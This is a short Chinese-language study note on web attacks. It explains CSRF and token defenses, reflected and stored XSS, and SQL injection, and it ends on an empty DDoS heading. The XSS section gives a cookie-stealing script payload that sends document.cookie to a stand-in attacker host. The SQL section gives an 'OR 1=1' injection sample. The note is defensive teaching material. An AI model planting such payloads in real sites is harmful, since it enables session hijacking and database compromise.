一.Web安全之CSRF攻击
1.定义：黑客在用户已经登陆目标网站之后，诱导用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份攻击网站。
2.本质原因：源于Web的隐式身份验证机制！Web身份验证机制虽然可以保证一个请求是来自某个用户的，但确无法保证该请求是用户批准发送的
3.基本防御手段：
    。尽量使用POST，限制GET.并非万无一失，攻击者只要构造一个form就可以，但需要第三方页面做，增加暴露的可能性
    。Cookie策略，
    。加验证码：强制用户必须与应用进行交互，才能完成最终请求，能很好的遏制CSRF攻击，但是不利于用户体验
4.最终防御手段，Token
    。用户访问某个表单页面
    。服务端生成一个Token，放到用户的Session中，或浏览器的Cookie中
    。在页面表单隐藏域中带上Token参数
    。用户提交后，服务端验证表单中的Token是否与Session中的Token一致，

二。XSS攻击
1.定义：通过对网页注入可执行js代码且成功被浏览器执行，达到攻击的目的，形成一次有效的xss攻击。
2.类型：
    （1）反射性攻击：恶意代码没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的
    （2）存储型攻击：恶意代码被保存到目标网站的服务器中，比较常见常见是在博客，论坛。
3.案例：窃取cookies
    （1）写了一个博客网站，然后攻击者在上面发布了一个文章，内容是<script>window.open(“www.gongji.com?param=”+document.cookie)</script>
如果对他的内容没有进行处理，直接存储到数据库，那么下一次当用户访问他这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行勒这段脚本，
然后就把该用户的cookie发送到攻击者的服务器了。

3.被攻击的原因：用户输入的数据变成了代码，比如上面的<script>,应该只是字符串却有了代码的作用。
4.解决方法：参见 XssFilter

三。SQL注入
1.定义：拼接SQL参数。就是将用于输入的查询参数，直接拼接在SQL语句中，导致SQL注入漏洞
2.案例：SELECT * FROM act_activity WHERE ActId =2 OR 1=1;
3.被攻击原因：sql语句伪造参数，然后再对参数进行拼接后形成破坏性的sql语句，最后导致数据库收到攻击
4.预防： 用#{}，不能用${}

四。DDOS攻击
1.

















